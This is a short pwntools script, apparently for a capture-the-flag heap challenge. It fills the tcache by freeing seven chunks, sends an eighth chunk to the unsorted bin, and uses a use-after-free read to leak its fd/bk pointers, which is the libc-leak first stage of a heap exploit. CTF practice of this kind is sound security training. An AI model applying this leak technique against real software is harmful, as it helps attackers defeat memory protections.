from pwn import *

context.binary = "./chal"
context.log_level = "info"

io = process("./chal")

def menu(c): io.sendlineafter(b"> ", str(c).encode())
def buy(i):
    menu(1)
    io.sendlineafter(b"> ", str(i).encode())
def sell(i):
    menu(4)
    io.sendlineafter(b"> ", str(i).encode())
def admire(i):
    menu(3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(16)

# 8 allocations
for i in range(8):
    buy(i)

# free 7 -> tcache full
for i in range(7):
    sell(i)

# free the 8th -> should go unsorted
sell(7)

leak = admire(7)
fd = u64(leak[:8])
bk = u64(leak[8:16])

print("leak16:", leak.hex())
print("fd:", hex(fd))
print("bk:", hex(bk))

io.close()
